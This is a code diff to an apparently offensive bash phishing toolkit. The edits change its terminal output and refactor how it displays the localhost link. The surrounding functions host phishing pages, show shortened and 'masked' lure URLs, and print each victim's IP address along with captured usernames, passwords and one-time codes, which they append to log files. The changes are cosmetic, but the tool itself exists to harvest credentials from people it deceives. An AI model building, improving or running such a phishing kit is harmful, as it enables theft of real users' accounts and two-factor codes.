@@ -10,7 +10,7 @@ MAGENTA="$(printf '\033[35m')"
 CYAN="$(printf '\033[36m')"
 WHITE="$(printf '\033[37m')"
 BLACK="$(printf '\033[30m')"
-NC='\033[0m' #Reset colour
+NC="$(printf '\033[0m')" #Reset colour
 #Background
 REDBG="$(printf '\033[41m')"
 GREENBG="$(printf '\033[42m')"
@@ -511,8 +511,8 @@ start_localhost() {
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
         setup_site
         { sleep 1; clear; banner; }
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
-				capture_data_check
+        displaylocalhost
+	capture_data_check
 }
 
 #Host and port setup
@@ -681,14 +681,17 @@ shorten_tinyurl() {
 }
 
 ## Display link
-displaylink(){
+displaylocalhost(){
 	clear
 	sbanner
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}http://${HOST}:${PORT}"
 }
+displaylink(){
+	displaylocalhost
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} ORIGINAL URL  : ${GREEN}${LINK}"
+}
 displayshortlink() {
 	displaylink
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} ORIGINAL URL  : ${GREEN}${LINK}"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 1 : ${GREEN}${final_isgd_url}"
 	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  1 : ${GREEN}${masked_isgd_url}"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 2 : ${GREEN}${final_shortcode_url1}"
@@ -791,8 +794,9 @@ capture_data_3() {
 capture_ip() {
 ##      IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IP=$(awk -F 'IP: ' '{print $2}' .server/www/ip.txt | xargs)
-        IFS=$'\n'
-        echo -e "\n${MAGENTA} Victim's IP : ${CYAN}$IP"
+	echo "${MAGENTABG}${CYAN}"
+        echo -e " Victim's IP : $IP ${RESETBG}"
+	echo "${RESETBG}${NC}"
 	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
 		echo " "
@@ -873,9 +877,10 @@ ip_details() {
 
 ## Get credentials
 capture_id() {
-	echo "${CYAN}"
+	echo "${MAGENTABG}${CYAN}"
         cat .server/www/usernames.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	echo "${RESETBG}${NC}"
+        echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> "logs/${log_name}.txt"
         cat .server/www/usernames.txt >> "logs/${log_name}.txt"
 	rm -rf .server/www/usernames.txt
@@ -883,9 +888,10 @@ capture_id() {
 
 ## Get credentials
 capture_pass() {
-	echo "${CYAN}"
+	echo "${MAGENTABG}${CYAN}"
 	cat  .server/www/pass.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	echo "${RESETBG}${NC}"
+        echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> logs/${log_name}.txt
         cat .server/www/pass.txt >> logs/${log_name}.txt
 	rm -rf .server/www/pass.txt
@@ -893,9 +899,10 @@ capture_pass() {
 
 ## Get otp
 capture_otp() {
-	echo "${CYAN}"
+	echo "${MAGENTABG}${CYAN}"
         cat  .server/www/otp.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	echo "${RESETBG}${NC}"
+        echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> logs/${log_name}.txt
         cat .server/www/otp.txt >> logs/${log_name}.txt
 	rm -rf .server/www/otp.txt
